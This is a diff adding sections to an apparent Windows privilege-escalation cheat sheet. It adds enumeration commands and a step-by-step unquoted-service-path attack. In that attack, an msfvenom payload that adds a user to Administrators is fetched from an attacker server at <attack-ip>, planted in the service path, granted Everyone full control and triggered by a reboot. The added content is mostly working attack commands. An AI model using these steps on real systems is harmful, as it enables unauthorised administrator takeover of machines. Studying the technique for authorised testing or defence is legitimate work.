@@ -20,6 +20,10 @@ ver
 
 # Current user
 whoami
+whoami /user
+whoami /groups
+whoami /priv
+whoami /all
 echo %username%
 
 # List all users
@@ -66,6 +70,8 @@ reg query HKLM /f password /t REG_SZ /s
 wmic service list
 wmic service list | findstr "Backup"
 wmic service list | findstr "Iperius"  # Iperius is a backup service
+# List all Unquoted Service Paths
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                              "
 # Get target process info
 wmic process get processid,parentprocessid,executablepath | find "<process-id>"
 # Get users SID
@@ -101,6 +107,16 @@ vi .\example.txt
 # Move file
 move .\example.txt ..\Desktop\
 
+# Change permission of a file
+icacls 'C:\Path\to\file' /grant Users:F
+icacls 'C:\Path\to\file' /grant Everyone:F
+
+# Query the configuration info for a specified service
+sc qc "Development Service"
+
+
+# Restart machine
+shutdown /r /t 0
 ```
 
 <br />
@@ -265,4 +281,51 @@ On "Iperius Backup" window, right-click on backup jobs "Documents" and select "R
 
 # On attack machine
 Now you should see an incoming connection.
+```
+
+<br />
+
+## Unquoted Service Path to Privilege Escalation
+
+```powershell
+
+# In victim Windows machine
+
+# Find unquoted service path
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "
+
+# Confirm the information for the service
+sc qc "Development Service"
+
+# If the service path is "C:\Program Files\Development Files\Devservice Files\Service.exe",
+# you can place the exploit to "C:\Program Files\Devservice.exe"
+
+# -----------------------------------------------------------------
+
+# In attack machine
+
+# Create the exploit using msfvenom
+msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe
+
+# Start local web server
+python3 -m http.server 8000
+
+# -------------------------------------------------------------
+
+# In victim Windows machine
+
+# Start PowerShell
+powershell
+# Wget
+Invoke-WebRequest -Uri http://<attack-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
+# Move the exploit to the target path
+mv .\Devservice.exe '\Program Files\Development Files\'
+
+# Change permission of the exploit
+icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F
+
+# Restart
+shutdown /r /t 0
+# or PowerShell's command
+Restart-Computer
 ```
